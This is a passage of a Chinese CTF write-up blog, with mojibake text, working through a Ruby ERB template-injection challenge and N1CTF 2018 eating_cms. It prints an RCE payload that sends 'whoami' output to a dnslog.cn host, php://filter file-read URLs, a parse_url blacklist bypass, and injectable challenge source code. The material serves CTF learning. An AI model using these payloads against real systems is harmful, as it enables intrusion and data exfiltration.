<p>æ‹¿ç€keyä¼ªé€ </p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850.png"
	width="1451"
	height="616"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850_hu11459710184018445397.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165808850_hu6144835324377429294.png 1024w"
	loading="lazy"
	
		alt="image-20250426165808850"
	
	
		class="gallery-image" 
		data-flex-grow="235"
		data-flex-basis="565px"
	
></p>
<p>/shopè·¯ç”±æ”¹cookie</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107.png"
	width="1564"
	height="688"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107_hu6464364018435507476.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250426165855107_hu12807538563112248723.png 1024w"
	loading="lazy"
	
		alt="image-20250426165855107"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p>è¿™é‡Œçœ‹åˆ°æœ‰rceçš„åšæ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="vg">$a</span> <span class="o">=</span> <span class="s2">&#34;mon123&#34;</span>
</span></span><span class="line"><span class="cl"><span class="vg">$b</span> <span class="o">=</span> <span class="nb">Array</span><span class="o">[</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span><span class="s2">&#34;bbb&#34;</span><span class="p">,</span><span class="s2">&#34;ccc&#34;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;$a: </span><span class="si">#{</span><span class="vg">$a</span><span class="o">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">//</span><span class="n">mon</span>
</span></span><span class="line"><span class="cl"><span class="nb">puts</span> <span class="s2">&#34;$b: </span><span class="si">#{</span><span class="vg">$b</span><span class="o">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">3</span><span class="o">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="o">//[</span><span class="s2">&#34;aaa&#34;</span><span class="p">,</span><span class="s2">&#34;bbb&#34;</span><span class="p">,</span><span class="s2">&#34;ccc&#34;</span><span class="o">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œï¼Œ$båŸæœ¬æ˜¯æ•°ç»„ï¼Œä½†æ˜¯å› ä¸ºè¢«æ‹¼æ¥åˆ°äº†å­—ç¬¦ä¸²ä¸­ï¼Œæ‰€ä»¥æ•°ç»„é»˜è®¤çš„ç±»å‹å˜æˆäº†<code>[&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;]</code>,è¿™æ ·ä¸Šé¢ä»£ç çš„é™åˆ¶ï¼Œä»åŸæœ¬çš„7ä¸ªå­—ç¬¦ï¼Œå˜æˆäº†7ä¸ªæ•°ç»„é•¿åº¦</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">/</span><span class="n">work</span><span class="o">?</span><span class="n">name</span><span class="p">[]</span><span class="o">=&lt;%=</span><span class="nf">system</span><span class="p">(</span><span class="s1">&#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn&#39;</span><span class="p">)</span><span class="o">%&gt;&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">2</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">3</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">4</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">5</span><span class="o">&amp;</span><span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="mi">6</span><span class="o">&amp;</span><span class="n">do</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;&lt;%=system(&#39;ping -c 1 `whoami`.xuu1g4.dnslog.cn&#39;)%&gt;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;1&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;2&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;3&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;4&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;5&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;6&#34;</span><span class="p">]</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">working</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="n1ctf-2018eating_cms">[N1CTF 2018]eating_cms
</h2><p>å…ˆè¿›register.phpæ³¨å†Œåç™»å…¥</p>
<p>urlå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–</p>
<p>ä¼ªåè®®è¯»ä¸€ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user.php?page=php://filter/convert.base64-encode/resource=index
</span></span></code></pre></td></tr></table>
</div>
</div><p>function.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s2">&#34;config.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">Hacker</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Location: hacker.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter_directory</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($query);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$query</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter_directory_guest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">,</span><span class="s2">&#34;info&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($query);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$token</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$query</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$k</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span> <span class="nv">$token</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="nx">hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">Filter</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="s2">&#34;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$whitelist</span> <span class="o">=</span> <span class="s2">&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*`-@=+&gt;&lt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$whitelist</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">Hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/</span><span class="si">$blacklist</span><span class="s2">/is&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">Hacker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">real_escape_string</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">sql_query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">login</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">Filter</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select * from `albert_users` where `username_which_you_do_not_know`= &#39;</span><span class="si">$user</span><span class="s2">&#39; and `password_which_you_do_not_know_too` = &#39;</span><span class="si">$pass</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($res);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nx">username_which_you_do_not_know</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;isadmin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="nx">isadmin_which_you_do_not_know_too_too</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">updateadmin</span><span class="p">(</span><span class="nv">$level</span><span class="p">,</span><span class="nv">$user</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#39;</span><span class="si">$level</span><span class="s2">&#39; where `username_which_you_do_not_know`=&#39;</span><span class="si">$user</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$sql</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//    var_dump($res);
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die();
</span></span></span><span class="line"><span class="cl"><span class="c1">//    die($res);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$res</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">register</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$mysqli</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$user</span> <span class="o">=</span> <span class="nx">Filter</span><span class="p">(</span><span class="nv">$user</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#39;</span><span class="si">$user</span><span class="s2">&#39;,&#39;</span><span class="si">$pass</span><span class="s2">&#39;,&#39;0&#39;)&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">sql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$mysqli</span><span class="o">-&gt;</span><span class="na">insert_id</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">logout</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">session_destroy</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Header</span><span class="p">(</span><span class="s2">&#34;Location: index.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;manage&#34;</span><span class="p">,</span><span class="s2">&#34;ffffllllaaaaggg&#34;</span><span class="p">,</span><span class="s2">&#34;info&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$uri</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_URI&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$uri</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">],</span> <span class="nv">$query</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œç”¨åˆ°parse_urlçš„è§£ææ¼æ´ï¼Œåœ¨<code>/user.php</code>å‰é¢åŠ æ–œæ ï¼Œå°±ä¼šè¢«å½“æˆhostè§£æï¼Œè¿”å›falseç»•è¿‡é»‘åå•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">FLAG_SIG</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;you can not visit it directly&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;you can find sth in m4aaannngggeee&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æç¤º<code>templates/upload.html</code></p>
<p>å‘ç°upllloadddd.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$allowtype</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;gif&#34;</span><span class="p">,</span><span class="s2">&#34;png&#34;</span><span class="p">,</span><span class="s2">&#34;jpg&#34;</span><span class="p">);</span>
